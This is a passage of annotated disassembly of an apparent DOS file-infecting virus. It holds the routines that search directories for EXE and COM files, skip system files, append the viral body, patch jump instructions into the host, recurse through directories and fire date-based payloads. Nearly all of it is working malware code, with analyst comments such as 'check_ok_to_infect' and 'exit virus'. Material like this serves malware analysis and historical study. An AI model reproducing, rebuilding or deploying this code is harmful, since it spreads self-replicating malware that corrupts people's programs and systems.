	xor	dx,dx
	mov	ax,0200h
	push	dx
	push	ax
	push	word ptr [h_1042]
	push	word ptr [h_1040]
	push	cs				;current seg to stack (for RETF)
	call	h_0d94
	or	dx,ax
	jz	h_07a5
	xor	dx,dx
	mov	ax,0200h
	push	dx
	push	ax
	push	word ptr [h_1042]
	push	word ptr [h_1040]
	push	cs				;current seg to stack (for RETF)
	call	h_0d8b
	add	ax,0001h
	adc	dx,+00h
	mov	dx,ax
	xor	ax,ax
	mov	[h_1048],dx
	mov	[h_1046],ax
	jmp	short h_07c3
h_07a5:
	xor	dx,dx
	mov	ax,0200h
	push	dx
	push	ax
	push	word ptr [h_1042]
	push	word ptr [h_1040]
	push	cs				;current seg to stack (for RETF)
	call	h_0d8b
	mov	dx,ax
	xor	ax,ax
	mov	[h_1048],dx
	mov	[h_1046],ax
h_07c3:
	xor	dx,dx
	mov	ax,0200h
	push	dx
	push	ax
	push	word ptr [h_1042]
	push	word ptr [h_1040]
	push	cs				;current seg to stack (for RETF)
	call	h_0d94
	xor	dx,dx
	or	ax,[h_1046]
	or	dx,[h_1048]
	push	dx
	push	ax
	xor	dx,dx
	mov	ax,0002h
	push	dx
	push	ax
	call	h_03f6				;call write_dword_at_loc
	add	sp,+08h				;cleanup stack
	inc	word ptr [h_0ff8]
h_07f3:
	mov	sp,bp
	pop	bp
	ret	
h_07f7:
	call	h_0476				;call check_ok_to_infect
	or	ax,ax
	jz	h_0801
	jmp	h_0903
h_0801:
	xor	ax,ax
	push	ax
	push	ax
	call	h_0370				;call get_file_word
	pop	cx
	pop	cx
	cmp	ax,5a4dh				;'MZ'
	jnz	h_0815
	call	h_053a
	jmp	h_0903
h_0815:
	mov	dx,[h_1042]
	mov	ax,[h_1040]
	add	ax,offset h_1400
	adc	dx,+00h
	or	dx,dx
	jng	h_0829
	jmp	h_0903
h_0829:
	jnge	h_0833
	cmp	ax,0fff0h
	jnae	h_0833
	jmp	h_0903
h_0833:
	mov	byte ptr [h_1044],01h		;set file_changed
	push	word ptr [h_1042]
	push	word ptr [h_1040]
	push	word ptr [h_0ff2]		;handle to stack
	call	h_0263				;call lseek_to_bof_plus_loc
	add	sp,+06h				;cleanup stack
	jmp	short h_086f
h_084c:
	mov	ax,0001h
	push	ax
	xor	ax,ax
	push	ax
	push	word ptr [h_0ff2]		;handle to stack
	call	h_01f7				;call write_to_file
	add	sp,+06h				;cleanup stack
	cmp	ax,0001h
	jz	h_0865
	jmp	h_0903
h_0865:
	add	word ptr [h_1040],+01h
	adc	word ptr [h_1042],+00h
h_086f:
	mov	dx,[h_1042]
	mov	ax,[h_1040]
	and	ax,000fh
	and	dx,0000h
	or	dx,ax
	jnz	h_084c
	mov	ax,offset h_1400
	push	ax
	xor	ax,ax
	push	ax
	push	word ptr [h_0ff2]		;handle to stack
	call	h_01f7				;call write_to_file
	add	sp,+06h				;cleanup stack
	cmp	ax,offset h_1400
	jnz	h_0903
	sub	word ptr [h_104c],offset h_1400
	sbb	word ptr [h_104e],+00h
	push	word ptr [h_105a]
	push	word ptr [h_1058]
	mov	dx,[h_1042]
	mov	ax,[h_1040]
	add	ax,offset h_0010
	adc	dx,+00h
	push	dx
	push	ax
	call	h_03f6				;call write_dword_at_loc
	add	sp,+08h				;cleanup stack
	xor	ax,ax
	push	ax
	push	ax
	call	h_039f				;call get_file_dword
	pop	cx
	pop	cx
	push	dx
	push	ax
	mov	dx,[h_1042]
	mov	ax,[h_1040]
	add	ax,offset h_000c
	adc	dx,+00h
	push	dx
	push	ax
	call	h_03f6				;call write_dword_at_loc
	add	sp,+08h				;cleanup stack
	mov	ax,00e9h
	push	ax
	xor	ax,ax
	push	ax
	push	ax
	call	h_03d1				;call write_word_at_loc
	add	sp,+06h				;cleanup stack
	mov	ax,[h_1040]
	dec	ax
	push	ax
	xor	dx,dx
	mov	ax,0001h
	push	dx
	push	ax
	call	h_03d1				;call write_word_at_loc
	add	sp,+06h				;cleanup stack
	inc	word ptr [h_0ff8]
h_0903:
	ret	
;
;			??
;
h_0904:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	sub	sp,+2ch				;allocate local DTA
	mov	ax,0027h			;search attributes
	push	ax				;to stack
	lea	ax,[bp-2ch]			;ax = ofs of local DTA
	push	ax				;to stack
	mov	ax,offset h_0f30		;ofs of wildcard_exe
	push	ax				;to stack
	call	h_0d4d				;call find_first
	add	sp,+06h				;cleanup stack
	or	ax,ax				;error?
	jz	h_0923				;no, continue
	jmp	h_0993				;else go try COM's
h_0923:
	mov	ax,0006h			;size of basrun_name
	push	ax				;to stack
	mov	ax,offset h_0f36		;ofs of basrun_name
	push	ax				;to stack
	lea	ax,[bp-0eh]			;ptr to name found in DTA
	push	ax				;to stack
	call	h_0ee5				;call strncmpi
	add	sp,+06h				;clean up stack
	or	ax,ax				;a match?
	jz	h_0987				;yes, skip this file
	mov	ax,0004h			;size of brun_name
	push	ax				;to stack
	mov	ax,offset h_0f3d		;ofs of brun_name
	push	ax				;to stack
	lea	ax,[bp-0eh]			;ofs of name found in DTA
	push	ax				;to stack
	call	h_0ee5				;call strncmpi
	add	sp,+06h				;cleanup stack
	or	ax,ax				;a match?
	jz	h_0987				;yes, skip this file
	mov	dx,[bp-10h]			;get filesize (high) from DTA
	mov	ax,[bp-12h]			;and filesize (low) from DTA
	mov	[h_105a],dx			;save filesize_high
	mov	[h_1058],ax			;and filesize_low
	lea	ax,[bp-0eh]			;ptr to name found in DTA
	push	ax				;to stack
	call	h_02a8				;call open_file_get_timedate
	pop	cx				;restore stack
	cmp	word ptr [h_0ff2],-01h		;handle = NONE?
	jz	h_0987				;yes, skip this file
	call	h_053a				;call ??
	lea	ax,[bp-0eh]
	push	ax
	call	h_0318
	pop	cx
	cmp	word ptr [h_0ff8],+02h
	jnae	h_0987
	cmp	word ptr [h_0018],+00h
	jnz	h_0987
	jmp	h_0a23
h_0987:
	lea	ax,[bp-2ch]
	push	ax
	call	h_0d6f
	pop	cx
	or	ax,ax
	jz	h_0923
h_0993:
	mov	ax,0027h				;'''
	push	ax
	lea	ax,[bp-2ch]
	push	ax
	mov	ax,offset h_0f42		;ofs of wildcard_com
	push	ax
	call	h_0d4d				;call find_first
	add	sp,+06h				;cleanup stack
	or	ax,ax
	jz	h_09ac
	jmp	h_0a23
h_09ac:
	mov	ax,offset h_0f48
	push	ax
	lea	ax,[bp-0eh]
	push	ax
	call	h_0ea3
	pop	cx
	pop	cx
	or	ax,ax
	jz	h_0a14
	mov	ax,offset h_0f53
	push	ax
	lea	ax,[bp-0eh]
	push	ax
	call	h_0ea3
	pop	cx
	pop	cx
	or	ax,ax
	jz	h_0a14
	mov	ax,offset h_0f5e
	push	ax
	lea	ax,[bp-0eh]
	push	ax
	call	h_0ea3
	pop	cx
	pop	cx
	or	ax,ax
	jz	h_0a14
	mov	dx,[bp-10h]
	mov	ax,[bp-12h]
	mov	[h_105a],dx
	mov	[h_1058],ax
	lea	ax,[bp-0eh]
	push	ax
	call	h_02a8				;call open_file_get_timedate
	pop	cx
	cmp	word ptr [h_0ff2],-01h
	jz	h_0a14
	call	h_07f7
	lea	ax,[bp-0eh]
	push	ax
	call	h_0318
	pop	cx
	cmp	word ptr [h_0ff8],+02h
	jnae	h_0a14
	cmp	word ptr [h_0018],+00h
	jz	h_0a23
h_0a14:
	lea	ax,[bp-2ch]
	push	ax
	call	h_0d6f
	pop	cx
	or	ax,ax
	jnz	h_0a23
	jmp	h_09ac
h_0a23:
	mov	sp,bp
	pop	bp
	ret	
h_0a27:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	sub	sp,+2ch
	inc	word ptr [h_0ff4]
	cmp	byte ptr [h_0ff6],02h
	jng	h_0a56
	cmp	word ptr [h_0ff4],+01h
	jnz	h_0a56
	cmp	word ptr [h_0018],+00h
	jnz	h_0a56
	call	h_0e7c
	mov	bx,0032h				;'2'
	cwd	
	idiv	bx
	or	dx,dx
	jz	h_0a56
	jmp	h_0ac7
h_0a56:
	cmp	word ptr [h_0ff4],+01h
	jng	h_0a71
	cmp	word ptr [h_0018],+00h
	jnz	h_0a71
	call	h_0e7c
	mov	bx,offset h_0004
	cwd	
	idiv	bx
	or	dx,dx
	jnz	h_0ac7
h_0a71:
	call	h_0904
	mov	ax,0037h				;'7'
	push	ax
	lea	ax,[bp-2ch]
	push	ax
	mov	ax,offset h_0f6a
	push	ax
	call	h_0d4d				;call find_first
	add	sp,+06h				;cleanup stack
	or	ax,ax
	jnz	h_0ac7
h_0a8a:
	test	byte ptr [bp-17h],10h
	jz	h_0abb
	cmp	byte ptr [bp-0eh],2eh			;'.'
	jz	h_0abb
	lea	ax,[bp-0eh]
	push	ax
	call	h_01a1
	pop	cx
	or	ax,ax
	jnz	h_0abb
	call	h_0a27
	cmp	word ptr [h_0ff8],+02h
	jnae	h_0ab3
	cmp	word ptr [h_0018],+00h
	jz	h_0acb
h_0ab3:
	mov	ax,offset h_0f6e
	push	ax
	call	h_01a1
	pop	cx
h_0abb:
	lea	ax,[bp-2ch]
	push	ax
	call	h_0d6f
	pop	cx
	or	ax,ax
	jz	h_0a8a
h_0ac7:
	dec	word ptr [h_0ff4]
h_0acb:
	mov	sp,bp
	pop	bp
	ret	
;
;			??
;
h_0acf:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	sub	sp,+10h				;allocate locals
				;bp-10 -> dos_ax
				;bp-0e -> dos_bx
				;bp-0c -> dos_cx
				;bp-0a -> dos_dx
				;bp-08 -> dos_si
				;bp-06 -> dos_di
				;bp-04 -> dos_error
				;bp-02 -> dos_flags
	mov	word ptr [h_0ff8],0000h		;clear ??
	mov	byte ptr [bp-0fh],36h		;ah = fn = get disk free space
	mov	byte ptr [bp-0ah],00h		;dl = drive = default
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	mov	ax,[bp-10h]			;get SPC
	mul	word ptr [bp-0ch]		;*bytes/sector
	xor	dx,dx				;make it a DWORD
	mov	bx,[bp-0eh]			;get available clusters
	xor	cx,cx				;as a DWORD
	push	cs				;save cs for far RET
	call	h_0d34				;call dword_mul
	mov	[h_104e],dx			;save disk_free_bytes (high)
	mov	[h_104c],ax			;and disk_free_bytes (low)
	mov	al,[h_0ff6]			;get default_disk_2
	cmp	al,[h_104a]			;is that default_disk_1?
	jnz	h_0b0f				;no, skip this
	call	h_0904				;call ??
h_0b0f:
	mov	ax,offset h_0ffa
	push	ax
	call	h_017a
	pop	cx
	mov	ax,offset h_0f71
	push	ax
	call	h_01a1
	pop	cx
	mov	word ptr [h_0ff0],0000h
	jmp	short h_0b33
h_0b27:
	mov	ax,offset h_0f6e
	push	ax
	call	h_01a1
	pop	cx
	inc	word ptr [h_0ff0]
h_0b33:
	cmp	word ptr [h_0ff0],+0ah
	jnge	h_0b27
	mov	word ptr [h_0ff4],0000h
	call	h_0a27
	mov	ax,offset h_0ffa
	push	ax
	call	h_01a1
	pop	cx
	cmp	byte ptr [h_0ff6],02h
	jng	h_0b6c
	mov	byte ptr [bp-0fh],0eh
	mov	al,[h_0ff6]
	mov	[bp-0ah],al
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	mov	ax,offset h_0ffa
	push	ax
	call	h_01a1
	pop	cx
h_0b6c:
	mov	sp,bp
	pop	bp
	ret	
;
;			??
;
h_0b70:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	sub	sp,+10h				;allocate locals
				;bp-10 -> dos_ax
				;bp-0e -> dos_bx
				;bp-0c -> dos_cx
				;bp-0a -> dos_dx
				;bp-08 -> dos_si
				;bp-06 -> dos_di
				;bp-04 -> dos_error
				;bp-02 -> dos_flags
	push	si				;save si
	mov	word ptr [bp-10h],3301h		;dos_ax = set Ctrl-Break state
	mov	byte ptr [bp-0ah],00h		;dos_dx (low) = OFF
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	mov	word ptr [bp-10h],2e00h		;dos_ax = set verify to OFF
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	mov	byte ptr [bp-0fh],2ch		;ah = fn = get time
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	push	word ptr [bp-0ah]		;seconds, hundreths to stack
	call	h_0e6b				;call init_random
	pop	cx				;cleanup stack
	mov	byte ptr [bp-0fh],2ah		;ah = fn = get date
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	mov	si,[bp-0ch]			;get year
	cmp	word ptr [bp-0ch],07c5h		;is year 1989?
	jnz	h_0bd4				;no, skip this
	cmp	byte ptr [bp-09h],07h		;is month July?
	jnz	h_0bd4				;no, skip this
	cmp	byte ptr [bp-0ah],06h		;is day 6th?
	jae	h_0bd4				;>= 6th, skip this
	cmp	word ptr [h_0018],+00h		;check ??
	jnz	h_0bd4				;no, skip this
	jmp	h_0cb1				;else exit virus
h_0bd4:
	cmp	word ptr [bp-0ch],07c8h		;is year 1992?
	jnae	h_0be7				;not yet, skip this
	cmp	byte ptr [bp-09h],04h		;is month April?
	jnae	h_0be7				;not yet, skip this
	mov	word ptr [h_0018],0001h		;set ??
h_0be7:
	mov	byte ptr [bp-0fh],19h		;ah = fn = get current disk
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	mov	al,[bp-10h]			;get current disk
	mov	[h_104a],al			;set default_disk_1
	mov	[h_0ff6],al			;and default_disk_2
	call	h_0acf				;call ??
	cmp	byte ptr [h_104a],02h
	jge	h_0c28
	mov	byte ptr [bp-0fh],0eh
	mov	byte ptr [bp-0ah],02h
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	mov	byte ptr [bp-0fh],19h
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	mov	al,[bp-10h]
	mov	[h_0ff6],al
h_0c28:
	call	h_0acf
	cmp	byte ptr [h_104a],05h
	jz	h_0c5e
	mov	byte ptr [bp-0fh],0eh
	mov	byte ptr [bp-0ah],05h
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	mov	byte ptr [bp-0fh],19h
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	mov	al,[bp-10h]
	mov	[h_0ff6],al
	cmp	byte ptr [h_0ff6],05h
	jnz	h_0c5e
	call	h_0acf
h_0c5e:
	mov	byte ptr [bp-0fh],0eh
	mov	al,[h_104a]
	mov	[bp-0ah],al
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
	cmp	si,07c5h
	jae	h_0c8b
	mov	al,54h					;'T'
	out	43h,al
	mov	al,05h
	out	41h,al
	mov	word ptr [bp-10h],2e01h
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
h_0c8b:
	cmp	word ptr [h_0018],+00h
	jz	h_0cb1
	mov	ax,offset h_0011
	push	ax
	mov	ax,offset h_0f73
	push	ax
	mov	ax,0002h
	push	ax
	call	h_01f7				;call write_to_file
	add	sp,+06h				;cleanup stack
	mov	word ptr [bp-10h],4c00h
	lea	ax,[bp-10h]			;get ptr to dos_ax
	push	ax				;to stack
	call	h_0cb6				;call do_doscall
	pop	cx				;cleanup stack
h_0cb1:
	pop	si
	mov	sp,bp
	pop	bp
	ret	
;
;			do_doscall
;
h_0cb6:
	push	bp				;save BP
	push	si				;and SI
	push	di				;and DI
	mov	bp,sp				;set up stack frame
				;bp+08 -> parameter (ptr to vars for DOS)
				;bp+06 -> return IP
				;bp+04 -> BP
				;bp+02 -> SI
				;bp+00 -> DI
	mov	bp,[bp+08h]			;get ptr to dos regs
	mov	ax,[bp+00h]			;get dos_ax
	mov	bx,[bp+02h]			;and dos_bx
	mov	cx,[bp+04h]			;and dos_cx
	mov	dx,[bp+06h]			;and dos_dx
	mov	si,[bp+08h]			;and dos_si
	mov	di,[bp+0ah]			;and dos_di
	int	21h				;call DOS
	mov	bp,sp				;reset ptr to stack frame
	mov	bp,[bp+08h]			;get ptr to dos regs
	mov	[bp+00h],ax			;set dos_ax
	mov	[bp+02h],bx			;set dos_bx
	mov	[bp+04h],cx			;set dos_cx
	mov	[bp+06h],dx			;set dos_dx
	mov	[bp+08h],si			;set dos_si
	mov	[bp+0ah],di			;set dos_di
	pushf					;copy DOS return flags
	pop	ax				;to ax
	mov	[bp+0eh],ax			;save dos_flags
	and	ax,0001h			;isolate carry bit
	mov	[bp+0ch],ax			;save dos_error
	cld					;up!
	pop	di				;restore regs
	pop	si
	pop	bp
	ret					;and done
;
;			set_basic_errcode
;   bp+4 -> DOS error return code
;
h_0cf9:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	push	si				;save reg var
	mov	si,[bp+04h]			;get DOS error return
	or	si,si				;high bit set
	jnge	h_0d18				;yes, skip this
	cmp	si,+58h				;unknown error?
	jna	h_0d0c				;no, continue
h_0d09:
	mov	si,0057h			;set max error
h_0d0c:
	mov	[h_0f90],si			;save errcode
	mov	al,[si+h_0f92]			;lookup in err_table
	cbw					;make it a word
	xchg	ax,si				;put table code into si
	jmp	short h_0d25			;and skip this
h_0d18:
	neg	si				;fix error code
	cmp	si,+23h				;at least ??
	ja	h_0d09				;yes, do normal stuff
	mov	word ptr [h_0f90],0ffffh	;else set ?? error
h_0d25:
	mov	ax,si				;error to ax
	mov	[h_0178],ax			;save error_return
	mov	ax,0ffffh			;flag error
	jmp	short h_0d2f			;do nothing
h_0d2f:
	pop	si				;restore reg var
	pop	bp				;and bp
	ret	0002h				;cleanup stack and done
;
;			dword_mul
;   NOTE: FAR RETURN USED!
;
h_0d34:
	push	si				;comment it yourself!
	xchg	ax,si
	xchg	ax,dx
	test	ax,ax
	jz	h_0d3d
	mul	bx
h_0d3d:
	xchg	ax,cx
	test	ax,ax
	jz	h_0d46
	mul	si
	add	cx,ax
h_0d46:
	xchg	ax,si
	mul	bx
	add	dx,cx
	pop	si
	retf	
;
;			find_first
;    on stack:  bp+08 -> attributes
;               bp+06 -> ptr to DTA area
;               bp+04 -> ptr to wildcard filename
;
h_0d4d:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	mov	ah,1ah				;fn = set DTA
	mov	dx,[bp+06h]			;get ofs of local DTA
	int	21h				;call DOS
	mov	ah,4eh				;fn = find first matching file
	mov	cx,[bp+08h]			;get attributes
	mov	dx,[bp+04h]			;get wildcard filename
	int	21h				;call DOS
	jnae	h_0d67				;error, do error code
	xor	ax,ax				;flag OK
	jmp	short h_0d6d			;and skip this
h_0d67:
	push	ax				;save error
	call	h_0cf9				;call set_basic_errcode
	jmp	short h_0d6d			;do nothing
h_0d6d:
	pop	bp				;restore bp
	ret					;and done
h_0d6f:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	mov	ah,1ah
	mov	dx,[bp+04h]
	int	21h				;set dta
	mov	ah,4fh					;'O'
	int	21h				;find next
	jnae	h_0d83
	xor	ax,ax
	jmp	short h_0d89
h_0d83:
	push	ax
	call	h_0cf9				;call set_basic_errcode
	jmp	short h_0d89
h_0d89:
	pop	bp
	ret	
h_0d8b:
	xor	cx,cx
	jmp	short h_0d9c
	db	0b9h,01h,00h,0ebh,08h			;0d8f .....
h_0d94:
	mov	cx,0002h
	jmp	short h_0d9c
	db	0b9h,03h,00h				;0d99 ...
h_0d9c:
	push	bp				;save bp
	push	si
	push	di
	mov	bp,sp				;set up stack frame
	mov	di,cx
	mov	ax,[bp+0ah]
	mov	dx,[bp+0ch]
	mov	bx,[bp+0eh]
	mov	cx,[bp+10h]
	or	cx,cx
	jnz	h_0dbb
	or	dx,dx
	jz	h_0e20
	or	bx,bx
	jz	h_0e20
h_0dbb:
	test	di,0001h
	jnz	h_0ddd
	or	dx,dx
	jns	h_0dcf
	neg	dx
	neg	ax
	sbb	dx,+00h
	or	di,+0ch
h_0dcf:
	or	cx,cx
	jns	h_0ddd
	neg	cx
	neg	bx
	sbb	cx,+00h
	xor	di,+04h
h_0ddd:
	mov	bp,cx
	mov	cx,offset h_0020			;' '
	push	di
	xor	di,di
	xor	si,si
h_0de7:
	shl	ax,1
	rcl	dx,1
	rcl	si,1
	rcl	di,1
	cmp	di,bp
	jnae	h_0dfe
	ja	h_0df9
	cmp	si,bx
	jnae	h_0dfe
h_0df9:
	sub	si,bx
	sbb	di,bp
	inc	ax
h_0dfe:
	loop	h_0de7
	pop	bx
	test	bx,0002h
	jz	h_0e0d
	mov	ax,si
	mov	dx,di
	shr	bx,1
h_0e0d:
	test	bx,0004h
	jz	h_0e1a
	neg	dx
	neg	ax
	sbb	dx,+00h
h_0e1a:
	pop	di
	pop	si
	pop	bp
	retf	0008h
h_0e20:
	div	bx
	test	di,0002h
	jz	h_0e2a
	mov	ax,dx
h_0e2a:
	xor	dx,dx
	jmp	short h_0e1a
;
;			dword_sar
;
h_0e2e:
	cmp	cl,10h
	jae	h_0e43
	mov	bx,dx
	shr	ax,cl
	sar	dx,cl
	neg	cl
	add	cl,10h
	shl	bx,cl
	or	ax,bx
	retf	
h_0e43:
	sub	cl,10h
	mov	ax,dx
	cwd	
	sar	ax,cl
	retf	
;
;			dword_shl
;   NOTE: FAR RETURN USED!
;
h_0e4c:
	cmp	cl,10h				;comment it yourself!
	jae	h_0e61
	mov	bx,ax
	shl	ax,cl
	shl	dx,cl
	neg	cl
	add	cl,10h
	shr	bx,cl
	or	dx,bx
	retf	
h_0e61:
	sub	cl,10h
	mov	dx,ax
	xor	ax,ax
	shl	dx,cl
	retf	
;
;			init_random
;
h_0e6b:
	push	bp				;save bp				;save bp
	mov	bp,sp				;setup stack frame
	mov	ax,[bp+04h]			;get passed seconds_hundreths
	xor	dx,dx				;make it a DWORD
	mov	[h_0fee],dx			;save random_seed_high
	mov	[h_0fec],ax			;and random_seed_low
	pop	bp				;restore bp
	ret					;and done
h_0e7c:
	mov	dx,[h_0fee]
	mov	ax,[h_0fec]
	mov	cx,offset h_015a
	mov	bx,4e35h				;'5N'
	push	cs				;current seg to stack (for RETF)
	call	h_0d34
	add	ax,0001h
	adc	dx,+00h
	mov	[h_0fee],dx
	mov	[h_0fec],ax
	mov	ax,[h_0fee]
	and	ax,7fffh
	jmp	short h_0ea2
h_0ea2:
	ret	
h_0ea3:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	push	si
	push	di
	mov	ax,ds
	mov	es,ax
	cld	
	mov	si,[bp+04h]
	mov	di,[bp+06h]
	xor	ax,ax
	mov	bx,ax
	mov	cx,617ah				;'za'
h_0eba:
	lodsb	
	mov	bl,[di]
	or	al,al
	jz	h_0edd
	scasb	
	jz	h_0eba
	cmp	al,ch
	jnae	h_0ece
	cmp	al,cl
	ja	h_0ece
	sub	al,20h					;' '
h_0ece:
	cmp	bl,ch
	jnae	h_0ed9
	cmp	bl,cl
	ja	h_0ed9
	sub	bl,20h					;' '
h_0ed9:
	cmp	al,bl
	jz	h_0eba
h_0edd:
	sub	ax,bx
	jmp	short h_0ee1
h_0ee1:
	pop	di
	pop	si
	pop	bp
	ret	
;
;			strncmpi
;   bp+8 -> length
;   bp+6 -> 1st filename
;   bp+4 -> 2nd filename
;
h_0ee5:
	push	bp				;save bp
	mov	bp,sp				;set up stack frame
	push	si				;save register vars
	push	di
	push	ds				;current ds
	pop	es				;to es
	cld					;up!
	mov	si,[bp+04h]			;get ptr to 2nd filename
	mov	di,[bp+06h]			;and ptr to 1st filename
	mov	cx,[bp+08h]			;get string length
	xor	ax,ax				;ax = 0
	mov	bx,ax				;bx, ax = 0 (WHY?)
	mov	dx,617ah			;dx = ?? 'za'
h_0efd:
	jcxz	h_0f22				;blank name, done
	lodsb					;get 2nd filename byte
	mov	bl,[di]				;get 1st filename byte
	or	al,al				;EOS in 2nd filename?
	jz	h_0f22				;yes, we're done
	scasb					;matches 2nd filename?
	loopz	h_0efd				;if so, do next byte
	cmp	al,dh				;upper case? ('a')
	jnae	h_0f13				;yes, skip this
	cmp	al,dl				;still upper case? ('z')
	ja	h_0f13				;yes, skip this
	sub	al,20h				;force upper case
h_0f13:
	cmp	bl,dh				;upper case?
	jnae	h_0f1e				;yes, skip this
	cmp	bl,dl				;still upper case?
	ja	h_0f1e				;yes, skip this
	sub	bl,20h				;force upper case
h_0f1e:
	cmp	al,bl				;match, ignoring case?
	jz	h_0efd				;yes, do next char
h_0f22:
	sub	ax,bx				;return differnce (< =="">)
	jmp	short h_0f26			;do nothing
h_0f26:
	pop	di				;restore reg vars
	pop	si
	pop	bp				;restore stack
	ret					;and done
	db	0006h dup (00h)				;0f2a .
h_0f30	db	"*.EXE"				;wildcard_exe
;	db	2ah,2eh,45h,58h,45h			;0f30
	db	00h					;0f35
h_0f36	db	"BASRUN"			;basrun_name
;	db	42h,41h,53h,52h,55h,4eh			;0f36
	db	00h					;0f3c
h_0f3d	db	"BRUN"				;brun_name
;	db	42h,52h,55h,4eh				;0f3d
	db	00h					;0f41
h_0f42	db	"*.COM"				;wildcard_com
;	db	2ah,2eh,43h,4fh,4dh			;0f42
	db	00h					;0f47
h_0f48	db	"IBMBIO.COM"
;	db	49h,42h,4dh,42h,49h,4fh,2eh,43h		;0f48
;	db	4fh,4dh					;0f50
	db	00h					;0f52
h_0f53	db	"IBMDOS.COM"
;	db	49h,42h,4dh,44h,4fh,53h,2eh,43h		;0f53
;	db	4fh,4dh					;0f5b
	db	00h					;0f5d
h_0f5e	db	"COMMAND.COM"
;	db	43h,4fh,4dh,4dh,41h,4eh,44h,2eh		;0f5e
;	db	43h,4fh,4dh				;0f66
	db	00h					;0f69
h_0f6a	db	2ah,2eh,2ah,00h				;0f6a *.*.
h_0f6e	db	2eh,2eh,00h				;0f6e ...
h_0f71	db	5ch,00h					;0f71 \.
h_0f73	db	07h					;0f73 .
	db	"Access denied."
;	db	41h,63h,63h,65h,73h,73h,20h,64h		;0f74
;	db	65h,6eh,69h,65h,64h,2eh			;0f7c
	db	0dh,0ah,00h				;0f82
	db	000bh dup (00h)				;0f85 .
h_0f90	dw	0012h				;errcode
;
;   errtable
;
h_0f92	db	00h,13h,02h,02h,04h,05h,06h,08h		;0f92 ........
	db	08h,08h,14h,15h,05h,13h,0ffh,16h	;0f9a ........
	db	05h,11h,02h,0ffh,0ffh,0ffh,0ffh,0ffh	;0fa2 ........
	db	0008h dup (0ffh)			;0faa .
	db	05h,05h,0ffh,0ffh,0ffh,0ffh,0ffh,0ffh	;0fb2 ........
	db	000ah dup (0ffh)			;0fba .
	db	0fh,0ffh,23h,02h,0ffh,0fh,0ffh,0ffh	;0fc4 ..#.....
	db	0ffh,0ffh,13h,0ffh,0ffh,02h,02h,05h	;0fcc ........
	db	0fh,02h,0ffh,0ffh,0ffh,13h,0ffh,0ffh	;0fd4 ........
	db	0006h dup (0ffh)			;0fdc .
	db	23h,0ffh,0ffh,0ffh,0ffh,23h,0ffh,13h	;0fe2 #....#..
	db	0ffh,00h				;0fea ..
h_0fec	dw	85cdh				;random_seed_low
h_0fee	dw	9d35h				;random_seed_high
h_0ff0	dw	000ah					;0ff0 ..
h_0ff2	dw	0005h				;handle
h_0ff4	dw	0001h					;0ff4 ..
h_0ff6	db	02h				;default_disk_2
	db	00h					;0ff6 ..
h_0ff8	dw	0000h					;0ff8 ..
h_0ffa	db	5ch,56h,00h				;0ffa \V.
	db	"OCKOUT"
;	db	4fh,43h,4bh,4fh,55h,54h			;0ffd
	db	00h					;1003
	db	003ch dup (00h)				;1004 .
h_1040	dw	0040h				;work_size_low
h_1042	dw	0000h				;work_size_high
h_1044	db	01h				;file_changed
	db	00h					;1044 ..
h_1046	dw	0000h				;high word of size_minus_header
h_1048	dw	001ch				;size_minus_header
h_104a	db	02h				;default_disk_1
	db	00h					;104a ..
h_104c	dw	8000h				;disk_free_bytes (low)
h_104e	dw	009fh				;disk_free_bytes (high)
h_1050	dw	0020h				;attributes
h_1052	dw	1174h				;file_date
h_1054	dw	0200h				;header_bytes_low
h_1056	dw	0000h				;header_bytes_high
h_1058	dw	0039h				;filesize_low
h_105a	dw	0000h				;filesize_high
h_105c	dw	22b6h				;file_time
	dw	0000h,0000h,0000h			;105e ......
	dw	00e8h dup (0000h)			;1064 ..
h_1234	db	01b4h dup (00h)				;1234 .
h_13e8	db	0018h dup (00h)				;13e8 .
h_1400	equ	$
fun	ends
	end	h_0002

</0>